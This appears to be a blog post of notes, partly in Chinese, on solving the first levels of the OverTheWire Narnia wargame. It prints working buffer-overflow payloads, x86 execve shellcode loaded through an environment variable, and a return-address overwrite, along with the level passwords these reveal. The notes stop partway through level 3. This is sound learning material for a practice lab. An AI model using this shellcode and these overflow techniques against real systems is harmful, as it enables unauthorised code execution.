---
layout: default
title: overthewire_wargames_notes_narnia
categories:
- C++
tags:
- C++
---
//Description:

//Create Date: 2020-02-25 15:42:55

//Author: channy

# overthewire_wargames_notes_narnia

[address](https://overthewire.org/wargames/narnia/)

> ssh -p2226 narnia0@narnia.labs.overthewire.org

## 1. 

```
narnia0@narnia:/narnia$ ls -lrht
total 108K
-r-sr-x--- 1 narnia1 narnia0 7.3K Aug 26 22:35 narnia0
-r--r----- 1 narnia0 narnia0 1.3K Aug 26 22:35 narnia0.c
-r-sr-x--- 1 narnia2 narnia1 7.2K Aug 26 22:35 narnia1
-r--r----- 1 narnia1 narnia1 1021 Aug 26 22:35 narnia1.c
-r-sr-x--- 1 narnia3 narnia2 5.0K Aug 26 22:35 narnia2
-r--r----- 1 narnia2 narnia2 1022 Aug 26 22:35 narnia2.c
-r-sr-x--- 1 narnia4 narnia3 5.6K Aug 26 22:35 narnia3
-r--r----- 1 narnia3 narnia3 1.7K Aug 26 22:35 narnia3.c
-r-sr-x--- 1 narnia5 narnia4 5.2K Aug 26 22:35 narnia4
-r--r----- 1 narnia4 narnia4 1.1K Aug 26 22:35 narnia4.c
-r-sr-x--- 1 narnia6 narnia5 5.5K Aug 26 22:35 narnia5
-r--r----- 1 narnia5 narnia5 1.3K Aug 26 22:35 narnia5.c
-r-sr-x--- 1 narnia7 narnia6 5.9K Aug 26 22:35 narnia6
-r--r----- 1 narnia6 narnia6 1.6K Aug 26 22:35 narnia6.c
-r-sr-x--- 1 narnia8 narnia7 6.4K Aug 26 22:35 narnia7
-r--r----- 1 narnia7 narnia7 2.0K Aug 26 22:35 narnia7.c
-r-sr-x--- 1 narnia9 narnia8 5.1K Aug 26 22:35 narnia8
-r--r----- 1 narnia8 narnia8 1.3K Aug 26 22:35 narnia8.c
```

c语言的编译器在分配内存时，不只是按照变量的定义顺序来分配的，而且还参考了变量的类型。

这个程序读入24个字节的字符串放到BUF里，  多余的4个字节就会覆盖VAL，   进而改变VAL的值

```
narnia0@narnia:/narnia$ python -c 'print "a"*20 + "\xef\xbe\xad\xde" + "\x80" '
aaaaaaaaaaaaaaaaaaaaﾭހ
narnia0@narnia:/narnia$ ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaaﾭހ
buf: aaaaaaaaaaaaaaaaaaaaﾭ�
val: 0xdeadbeef
$ whoami
narnia1
$ cat /etc/narnia_pass/narnia1
efeidiedae

//但是用python3就不行哦～
narnia0@narnia:/narnia$ python3 -c 'print("a"*20 + "\xef\xbe\xad\xde" + "\x80")'
aaaaaaaaaaaaaaaaaaaaï¾­Þ
```

## 2. shellcode, export临时环境变量

[常用shellcode](http://shell-storm.org/shellcode/)

对于本题，用[Linux/x86 - execve(/bin/dash) - 49 bytes by Chroniccommand](http://shell-storm.org/shellcode/files/shellcode-756.php)

```narnia1.c
#include <stdio.h>
 
int main(){
    int (*ret)();
 
    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }   
 
    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();
 
    return 0;
}
```

```
narnia1@narnia:/narnia$ export EGG=$'\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43'
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
nairiepecu
```

## 3. 输入超长字符串覆盖返回地址

```narnia2.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

[reference](https://bbs.pediy.com/thread-252827.htm)

```
narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print "\x90"*94+"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x8d\x4e\x08\x89\x46\x0c\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"+"\x50\xd8\xff\xff"') 
$ whoami 
narnia3 
$ cat /etc/narnia_pass/narnia3 
vaequeezee 
```

## 4.

```narnia3.c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
``` 

ifile 和 ofile 挨在一起， 然后strcpy 又没有对长度进行一个检查，



[back](/)

